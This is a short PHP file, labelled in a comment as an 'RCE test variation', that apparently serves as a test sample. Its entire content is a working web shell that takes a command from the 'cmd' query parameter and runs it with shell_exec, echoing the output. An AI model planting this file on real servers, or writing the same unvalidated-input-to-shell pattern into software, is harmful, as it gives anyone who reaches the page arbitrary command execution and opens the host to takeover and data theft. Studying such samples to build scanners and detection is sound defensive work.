<?php
// RCE test variation #3
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>